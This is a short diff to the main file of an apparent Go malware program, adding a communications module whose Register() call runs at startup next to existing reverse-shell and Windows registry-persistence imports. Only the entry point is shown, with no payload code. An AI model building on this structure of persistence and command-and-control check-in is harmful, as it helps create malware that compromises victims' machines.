@@ -1,12 +1,15 @@
 package main
 
 import (
-	"mal/reverse"
+	communications "mal/comms"
 	"mal/persistence"
+	"mal/reverse"
 	"runtime"
 )
 
 func main() {
+
+	communications.Register()
 
 	if runtime.GOOS == "windows" {
 		persistence.AddToRegistry()
